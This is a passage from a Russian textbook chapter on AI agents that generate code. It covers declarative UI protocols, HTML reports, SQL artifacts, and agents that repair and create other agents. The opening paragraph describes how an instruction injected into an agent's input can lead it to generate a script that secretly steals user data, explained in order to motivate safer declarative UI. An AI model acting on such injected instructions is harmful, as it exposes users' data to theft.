Когда агент напрямую генерирует HTML- и JavaScript-код для UI, возникает фундаментальная проблема безопасности: сгенерированный код может содержать вредоносные элементы. Например, злоумышленник может намеренно спрятать инструкцию во входных данных, после чего агент под воздействием инъекции в промпт незаметно сгенерирует скрипт, тайно похищающий пользовательские данные. Здесь важно правильно определить причинно-следственную связь: причиной служит **инъекция в промпт** — вредоносная инструкция попадает во входные данные агента, — а итоговый эффект, когда браузер выполняет вредоносный скрипт и похищает данные, похож на традиционную веб-атаку XSS (Cross-Site Scripting, межсайтовый скриптинг). Нельзя называть всю атаку непосредственно XSS. Декларативные протоколы интерфейсов, такие как A2UI (Agent-to-User Interface), предлагают более безопасный подход: агент не генерирует непосредственно исполнимый код, а выдаёт только «спецификацию интерфейса» в формате JSON, например: «Покажите таблицу из 3 строк и 2 столбцов с заголовком „Данные о продажах“». Получив спецификацию, клиент визуализирует интерфейс с помощью заранее подготовленных безопасных компонентов. Это похоже на ресторанное меню: посетитель — агент — может заказать только блюда из меню — предопределённые компоненты, — но не может войти на кухню и приготовить что-то самостоятельно, то есть выполнить произвольный код. Здесь также важно устранить распространённую путаницу: AG-UI (Agent-User Interaction), предложенный CopilotKit, несмотря на сходное название, не является языком описания интерфейсов. Это сопутствующий **протокол событий и передачи**, который потоково отправляет во фронтенд состояние выполнения агента — сообщения, вызовы инструментов и изменения состояния. Он даже может переносить интерфейсную полезную нагрузку A2UI. Поэтому A2UI и AG-UI дополняют друг друга, а не относятся к одному классу, и их не следует перечислять как разновидности одного «декларативного протокола интерфейсов».

Основной принцип таких протоколов — **приоритет безопасности**. Клиент поддерживает каталог доверенных компонентов, например Card, Button, TextField и Table. Агент может запрашивать рендеринг только существующих в каталоге компонентов и не способен внедрить произвольный код. Клиент использует собственные нативные компоненты, а не выполняет произвольный HTML, созданный агентом. Такие протоколы обычно поддерживают **кроссплатформенность** — одно описание можно визуализировать в React, Flutter и нативных приложениях — и **инкрементальную генерацию** в потоковом формате JSONL с рендерингом по мере получения данных.

Разумеется, декларативный подход подходит для стандартизированных сценариев взаимодействия — форм, таблиц и карточек. Для сильно специализированных требований, например пользовательских визуализаций или игровых интерфейсов, непосредственная генерация кода остаётся более гибким вариантом. Ниже рассматриваются конкретные применения обоих подходов.

**Результат в виде HTML вместо отчёта Markdown.** Генеративный UI используется не только во время взаимодействия, но и меняет форму конечного **результата работы** агента. Традиционно после выполнения задачи агент создаёт отчёт в Markdown, однако последовательное чтение линейно организованных страниц Markdown не слишком удобно. По мере совершенствования способности агентов генерировать фронтенд-код всё больше практических решений переходят к непосредственному созданию HTML. По сравнению с Markdown результат в HTML имеет несколько очевидных преимуществ. Первое — **интерактивная демонстрация**: работу системы можно показать непосредственно в управляемой форме, которую пользователь зачастую понимает с первого взгляда лучше, чем длинное текстовое описание. Второе — **более качественная визуализация данных**: вместо таблиц можно использовать диаграммы и создавать интерактивные компоненты, позволяющие пользователям самостоятельно просматривать и фильтровать данные, а также переходить к интересующим подробностям. Третье — **постоянно совершенствуемый результат**: HTML-сайт необязательно должен быть статичным объектом, однократно созданным по завершении задачи. Агент может непрерывно дополнять и улучшать его по мере выполнения работы.

Например, при написании каждой научной статьи автор поддерживает интерактивный сайт[^ch5-4]. Это не только конечный результат, но и живой документ исследовательского процесса, который агент постоянно обновляет по мере проведения экспериментов. Такой сайт выполняет как минимум три функции. Первая — **прослеживаемость экспериментальных данных**: на сайте можно отдельно просмотреть конкретные данные каждого эксперимента, использованный промпт и исходный ответ LLM. Представление этих материалов в развёрнутом виде облегчает обнаружение проблем в построении, формате и распределении данных, а также систематических отклонений в ответах LLM и оценках judge. Вторая — **мониторинг показателей обучения**: кривые процесса обучения непосредственно выводятся на веб-странице, позволяя в любой момент проверить, находятся ли в норме **показатели «внутреннего здоровья»** модели. Здесь используется медицинская метафора: показатели «внутреннего здоровья» — это внутренние сигналы, отражающие нормальность самого процесса обучения, например потери на обучающей и валидационной выборках, норма градиента, скорость обучения, перплексия (perplexity) при генерации токенов моделью — мера её «уверенности» в создаваемом содержимом, — а также вознаграждение, KL-дивергенция и энтропия политики при обучении с подкреплением. Они отличаются от итоговых метрик, таких как точность выполнения задачи. Подобно тому как физиологические показатели на медицинском обследовании позволяют судить о состоянии человека раньше, чем это проявится внешне, показатели «внутреннего здоровья» способны заранее выявить отсутствие сходимости функции потерь, взрыв градиентов, разрушение процесса обучения и другие проблемы. Третья функция — **демонстрация принципов работы**: визуализация всей архитектуры позволяет с первого взгляда понять устройство системы, созданной с помощью AI.

[^ch5-4]: Сайты исследовательских проектов автора доступны по адресу https://01.me/research/; каждый проект сопровождается постоянно обновляемым интерактивным сайтом.

**Уточнение намерения пользователя.**

Если пользователь формулирует потребность расплывчато или неполно, агенту необходимо задать уточняющие вопросы и собрать недостающую информацию. Такие продукты, как OpenAI Deep Research, обычно используют текстовые вопросы и ответы, но у этого подхода есть очевидные ограничения. С точки зрения эффективности каждый вопрос требует отдельного раунда диалога, поэтому десять уточнений потребуют десяти раундов взаимодействия. С точки зрения выразительности между некоторыми вопросами существуют зависимости: например, выбор места назначения влияет на доступные варианты транспорта, а чистый текст плохо представляет такие каскадные связи.

Благодаря генерации кода агент может вместо текстовых вопросов создавать структурированные интерактивные интерфейсы. На рисунке 5-8 показан процесс динамического создания формы, в котором агент преобразует уточняющие вопросы в структурированный интерфейс для однократного заполнения. Агент генерирует HTML-форму с различными элементами ввода: текстовые поля собирают открытые ответы, раскрывающиеся списки позволяют выбирать из заранее заданных вариантов, флажки поддерживают множественный выбор, а элемент выбора даты упрощает ввод времени. Более того, агент способен генерировать каскадные формы с динамической логикой на JavaScript: после выбора определённого варианта последующие вопросы автоматически отображаются или скрываются, а доступные варианты динамически обновляются. Пользователь заполняет всю форму за один раз без многораундового диалога и при этом ясно видит все необходимые сведения и логические связи между вопросами.

> **Цель эксперимента**: проверить способность агента уточнять намерение пользователя посредством динамически создаваемых HTML-форм.
>
> **Техническое решение**: агент анализирует запрос пользователя, определяет вопросы для уточнения и генерирует код формы с каскадной логикой. Фронтенд выполняет рендеринг, пользователь отправляет форму один раз, а агент разбирает данные JSON и продолжает выполнение задачи.

> **Критерии приёмки**: на запрос пользователя «Я хочу купить билет на самолёт до Пекина» агент генерирует форму со следующими полями: город отправления — текстовое поле, дата отправления — выбор даты, тип поездки — единственный выбор между «в одну сторону» и «туда и обратно», дата возвращения — отображается только при выборе варианта «туда и обратно». Пользователь предоставляет всю информацию одной отправкой формы.

**Генерация SQL-запросов.**

Запросы к базе данных — сценарий, в котором генерация кода способна значительно улучшить взаимодействие. Традиционный доступ к базам данных требует GUI-инструментов или написания SQL вручную: первый вариант неудобен, а второй требует профессиональных знаний. Агент может преобразовать естественный язык в SQL, но здесь возникает принципиальный архитектурный выбор: должен ли агент выполнить SQL и описать результат на естественном языке либо сгенерировать SQL-код как artifact, который фронтенд выполнит напрямую?

Первый вариант кажется более «интеллектуальным», но крайне неэффективен. Результат запроса может содержать большую таблицу из тысяч строк. Чтение этих данных LLM и их последующее текстовое описание не только расходуют множество токенов и занимают много времени, но и создают высокий риск ошибки при «переписывании» данных моделью. Более качественное решение — **режим artifact**. На рисунке 5-9 показан рабочий процесс агента SQL-запросов: агент не читает данные самостоятельно, а генерирует SQL-запрос и передаёт его системе как отдельный «артефакт» (artifact). Система выполняет этот SQL непосредственно в базе данных и визуализирует полученные данные в доступной пользователю таблице. На протяжении всего процесса данные поступают из базы напрямую в пользовательский интерфейс, полностью обходя LLM как «посредника». LLM отвечает только за написание запроса и не должна самостоятельно читать и пересказывать тысячи строк, что обеспечивает скорость и точность.

![Рисунок 5-9. Процесс работы агента SQL-запросов](images/fig5-9.svg)


Более того, агент может создать два artifact, образующих конвейер: SQL-запрос и код визуализации, например столбчатую диаграмму. Фронтенд напрямую передаёт результат SQL коду визуализации, а LLM отвечает только за генерацию кода и не участвует в передаче данных. Именно в этом проявляется сущность генерации кода как интерфейса.

> **Эксперимент 5-10 ★★: ERP-агент с взаимодействием на естественном языке**
>
> ERP — программное обеспечение для планирования ресурсов предприятия — является ключевой системой компании и обычно использует GUI, в котором сложные операции требуют множества щелчков мышью. AI-агент может преобразовывать запросы пользователя на естественном языке в SQL и тем самым автоматизировать получение данных.
>
> Требуется создать базу данных PostgreSQL с двумя таблицами: (1) таблица сотрудников, содержащая ID сотрудника, имя, отдел, уровень, дату приёма и дату увольнения — пустое значение означает, что сотрудник продолжает работать; (2) таблица зарплат, содержащая ID сотрудника, дату выплаты и зарплату — по одной записи за каждый месяц. Агент должен автоматически отвечать на вопросы:
>
> 1. Какова средняя продолжительность работы сотрудника в компании?
> 2. Сколько действующих сотрудников работает в каждом отделе?
> 3. В каком отделе средний уровень сотрудников наиболее высокий?
> 4. Сколько новых сотрудников было принято в каждый отдел в этом и прошлом году?
> 5. Какова средняя зарплата в отделе A с марта позапрошлого года по май прошлого года?
> 6. В каком отделе средняя зарплата в прошлом году была выше: A или B?
> 7. Какова средняя зарплата сотрудников каждого уровня в этом году?
> 8. Какова средняя зарплата за последний месяц у сотрудников, работающих менее года, от одного до двух лет и от двух до трёх лет?
> 9. Какие 10 сотрудников получили наибольшее повышение зарплаты с прошлого по текущий год?
> 10. Есть ли задолженность по зарплате — месяц, в котором сотрудник работал, но не получил выплату?
>

**Динамическое создание программного обеспечения.**

Предельное применение генерации кода заключается в способности агента полностью динамически создавать программное обеспечение с нуля. Проект Anthropic «Imagine with Claude» продемонстрировал границы этой возможности: пользователь формулирует требование, Claude в реальном времени создаёт фронтенд-интерфейс и логику взаимодействия, пользователь работает со сгенерированной программой, а Claude изменяет код и создаёт новый интерфейс для отображения результата операции. На глазах у пользователя с нуля возникает и непрерывно развивается приложение.

Однако полностью динамическая генерация требует больших затрат и сопровождается высокой задержкой, поэтому лучше подходит для экспериментов, демонстрирующих границы возможностей. Более практичное направление — **адаптация существующего фреймворка**. Такой «частично настраиваемый» режим сохраняет стабильность базовой программы, одновременно предоставляя пользователю контроль над отдельными аспектами. Пользователь может сказать: «Сделай кнопку синей», «Добавь в боковую панель меню быстрого доступа» или «Замени шрифт на более удобный для чтения». Агент понимает требование и изменяет фронтенд-код, после чего горячая загрузка HMR (Hot Module Replacement — частичная горячая замена с сохранением состояния приложения и применением изменений без полного обновления страницы) немедленно применяет результат. Такой подход превращает стандартизированный продукт «один для всех» в персонализированный интерфейс «для каждого свой».

> **Эксперимент 5-11 ★★: диалоговая система настройки интерфейса**
>
> **Цель эксперимента**: реализовать возможность немедленной настройки интерфейса программы посредством диалога на естественном языке и проверить эффективность генерации кода с горячей загрузкой для персонализации пользовательского опыта.
>
> **Техническое решение**: создать базовое приложение chatbot с фронтендом React и бэкендом FastAPI. Обе части работают в режиме разработки и поддерживают горячую загрузку: HMR для React и reload для FastAPI. Пользователь в диалоге формулирует требования к настройке UI — цветам, шрифтам, компоновке, расположению компонентов и другим параметрам, — после чего агент самостоятельно изменяет код. Механизм горячей загрузки автоматически обнаруживает изменения файлов, фронтенд повторно компилируется и обновляется, а пользователь в реальном времени видит изменения интерфейса. Поддерживается многораундовая итеративная настройка.
>
### Код создаёт код: самозагрузка агента

В предыдущих разделах были показаны применения генерации кода в разных областях — от математических рассуждений и создания документов до настройки интерфейсов. Если довести эти возможности до предела, возникает естественный вопрос: способен ли агент с помощью генерации кода создать другого агента?

Сначала необходимо провести границу с главой 8. В этом разделе рассматривается использование кода агентом для **исправления и создания агентов того же класса, что и он сам**: самовосстановления, самокопирования и создания новых агентов по мере необходимости. Объектом воздействия здесь выступают код и структура агента. «Самоэволюция» из главы 8 — другое понятие: непрерывное наращивание возможностей агента **без изменения весов модели** посредством накопления опыта, оптимизации промптов и расширения набора инструментов. В этом случае объектом воздействия становятся знания и стратегия агента. Оба процесса можно назвать «эволюцией», но во избежание путаницы с названием главы 8 здесь способность «создавать агентов с помощью кода» называется **самозагрузкой** (bootstrapping).


![Рисунок 5-10. Цикл самозагрузки агента](images/fig5-10.svg)


**Самовосстановление агента: OpenClaw Doctor.**

Важной предпосылкой самозагрузки агента является способность к самовосстановлению. Команда `doctor` в OpenClaw служит примером такой возможности: она автоматически выявляет проблемы трёх типов:

- **Нарушения конфигурации**: истёкшие OAuth-токены, устаревшие форматы конфигурации, конфликты портов
- **Проблемы состояния**: устаревшие файлы блокировки сеансов, отсутствующие зависимости плагинов
- **Проблемы работоспособности сервисов**: неработающий шлюз, отсутствующий образ песочницы

Затем они автоматически устраняются с помощью многоуровневой стратегии: безопасные исправления — нормализация конфигурации и очистка файлов блокировки — выполняются автоматически; рискованные операции — перезапуск сервиса или принудительная перезапись конфигурации — требуют подтверждения пользователя.

Здесь важно избежать преувеличений. Для таких распространённых проблем, как истёкший токен, устаревший файл блокировки или конфликт портов, существуют чёткие правила обнаружения и фиксированные действия по устранению. Поэтому `doctor` сначала покрывает их **набором детерминированных проверок**, принципиально не отличающихся от традиционных эксплуатационных скриптов. Способности агента по-настоящему проявляются на втором уровне: сложные проблемы, не охваченные детерминированными правилами, передаются LLM, которая анализирует журналы ошибок, понимает семантику конфигурационных файлов, выводит причинно-следственные связи и создаёт специализированное решение. Детерминированные проверки обеспечивают стабильное устранение распространённых проблем, а LLM обрабатывает сложные случаи из длинного хвоста. Благодаря сочетанию этих двух уровней `doctor --fix` способен автоматически устранять значительную долю распространённых проблем шлюза. Когда объектом работы агента становится не внешняя система, а его собственная среда выполнения, модель «агент исправляет агента» превращает самовосстановление из системного адаптера в инфраструктурную основу самозагрузки агента.

**Ключевые приёмы создания агентов с помощью агента.**

Создать качественного агента намного сложнее, чем сгенерировать код обычного приложения: для этого требуется глубокое понимание архитектурных шаблонов агентов, лучших практик и распространённых ловушек. Без специальных знаний даже самая мощная модель генерации кода может создать агента с серьёзными архитектурными недостатками. К распространённым недостаткам относятся:

1. **Небрежное управление контекстом**: не используется стандартный формат контекста, рассмотренный в главе 2; траектория преобразуется в обычный текст и помещается в контекст; игнорируется оптимизация KV-кэша за счёт структурированных сообщений; цикл вызова инструментов содержит граничные ошибки
2. **Ненадлежащее проектирование инструментов**: краткие описания, отсутствие границ применимости и списка недопустимых сценариев, отсутствие конкретных примеров параметров
3. **Устаревший выбор технологий**: предпочтение наиболее распространённых в обучающих данных, но уже устаревших моделей и API. Решение — поддерживать базу знаний SOTA или предоставить агенту возможность поиска
4. **Отрыв от внешней экосистемы**: использование устаревших API, неподдерживаемых библиотек или дефектных шаблонов

Наиболее эффективный способ устранить эти проблемы — не пытаться исчерпывающе перечислить все правила в промпте, а **предоставить реализацию качественного агента как эталонный пример**, чтобы агент генерации кода модифицировал её, а не начинал с нуля.

Преимущества «генерации на основе примера» очевидны: код примера сам служит носителем лучших практик. Агенту проще правильно изменить существующий пример, чем написать всё с нуля, а удачные архитектурные решения сохраняются естественным образом без необходимости явно перечислять каждое правило в промпте.

Получив задачу разработать нового агента, агент должен сначала скопировать собственный код или другую проверенную качественную реализацию, а затем внести целевые изменения: настроить системный промпт под новую роль, заменить, добавить или удалить инструменты для поддержки новых функций, изменить бизнес-логику, сохранив архитектурный каркас. Такая модель «самокопирования с адаптивной модификацией» позволяет новому агенту унаследовать основные технические преимущества и одновременно приобрести необходимые отличия в отдельных аспектах — подобно копированию генов с последующей мутацией в биологии.

> **Эксперимент 5-12 ★★★: создание агента, способного создавать агентов**
>
> **Цель эксперимента**: создать Coding Agent с возможностями метапрограммирования (Metaprogramming — написание программ, которые генерируют или изменяют другие программы), способный автоматически создавать новые системы агентов на основе требований пользователя и обеспечивать соблюдение лучших практик.
>
> **Техническое решение**: предоставить Coding Agent качественную реализацию агента как эталонный пример — можно использовать сам проект ch5/coding-agent. Получив запрос на создание нового агента, он сначала копирует код примера, а затем целенаправленно изменяет его в соответствии с конкретными требованиями пользователя.
>
> **Критерии приёмки**: созданный агент успешно запускается и выполняет базовые задачи. Необходимо проверить использование стандартного формата сообщений и протокола вызова инструментов, а также актуальных рекомендуемых моделей и API. Следует протестировать корректность управления контекстом и состоянием в многораундовом диалоге. Сравнить генерацию с нуля и изменение готового примера, подтвердив преимущество второго подхода по качеству и эффективности.
>
>

Самозагрузка агента представляет собой предельное применение генерации кода: агент, способный создавать агентов, реализует самовоспроизводство интеллекта. Таким образом, мы проследили всю основную линию главы — от основ Coding Agent через многообразную ценность генерации кода до самозагрузки.

## Итоги главы

Центральная тема этой главы всегда оставалась неизменной: код — это не только инструмент для написания программ, но и язык формализованного мышления и точного выражения мыслей агента.

Главный вывод раздела о проектировании Harness заключается в следующем: высокая зрелость Coding Agent обусловлена не особой мощностью моделей генерации кода, а тем, что инфраструктура, накопленная за десятилетия разработки программного обеспечения, — наборы тестов, системы типов и контроль версий — естественным образом образует мощный Harness. Этот вывод следует распространить и на другие сценарии применения агентов. В разделе о сбоях и восстановлении после ошибок рассматривается другая сторона той же темы: надёжность агента зависит не от того, совершает ли модель ошибки, а от наличия для каждого типа сбоя соответствующих путей обнаружения, восстановления и завершения работы.

Во второй части была показана широкая ценность генерации кода за пределами программирования по шести направлениям, рассмотренным в основном тексте:

- **Инструмент мышления**: применение символьных вычислений и решения ограничений для компенсации недостатков вероятностного мышления
- **Исполнимые ограничения на основе бизнес-правил**: однозначное выражение бизнес-правил и создание детерминированного защитного барьера в сценариях с необратимыми операциями — ценность такой гарантии безопасности намного превосходит стоимость её реализации
- **Генерация мультимедиа**: создание PPT, видео и другого мультимодального контента с помощью механизма «предлагающий — проверяющий»
- **Системный адаптер**: полная автоматизация разбора журналов и диагностики проблем за счёт автоматического отслеживания изменений форматов
- **Генеративный UI**: динамическое создание форм, визуализаций и даже полноценных настраиваемых приложений, преодолевающее ограничения чистого текста
- **Самозагрузка агента**: исправление и создание однотипных агентов с помощью кода, позволяющие создать агента, способного создавать агентов

Ценность кода для агента состоит в том, что код одновременно служит средством выполнения задач и механизмом накопления знаний, создания инструментов и самооптимизации — настоящей «метаспособностью».

На этом мы завершили обсуждение двух из трёх главных опор — контекста и инструментов, причём генерация кода является наиболее универсальным из этих инструментов. Однако один ключевой вопрос остаётся без ответа: как научно измерить эффективность этих проектных решений? Начиная со следующей главы мы переходим к третьей опоре — модели — и прежде всего рассмотрим оценивание. В следующей главе будет разработана полноценная методология оценивания: от создания среды оценки и проектирования наборов данных до моделей вознаграждения и выбора моделей на основе результатов оценки. Она предоставит средства количественной проверки всех технических решений, обсуждавшихся в предыдущих главах.

## Вопросы для размышления

1. ★★ Генерацию кода называют «метаспособностью» AI-агента. Однако выполнение кода несёт риски безопасности: сгенерированный агентом код может содержать уязвимости, бесконечные циклы или приводить к исчерпанию ресурсов. Изоляция в песочнице решает часть проблем, но одновременно ограничивает возможности кода — например, запрещает доступ к сети или файловой системе. Как найти оптимальный баланс между безопасностью и возможностями?
2. ★★★ Самозагрузка агента — способность агента создавать других агентов — реализует «самовоспроизводство интеллекта». Однако при каждой самозагрузке могут возникать новые отклонения или ошибки. Будут ли эти ошибки накапливаться из поколения в поколение? Как предотвратить деградацию при самозагрузке агентов?
3. ★★ Агент для генерации кода при разборе журналов может автоматически адаптироваться к изменениям формата. Но если изменение формата вызвано ошибкой, а не запланированной модификацией, адаптивность агента, наоборот, скроет проблему. Как агенту отличать «изменение, к которому нужно адаптироваться», от «аномалии, о которой нужно сообщить»?
4. ★★ В этой главе механизм «предлагающий — проверяющий» неоднократно применяется для создания PPT, редактирования видео и визуализации журналов.
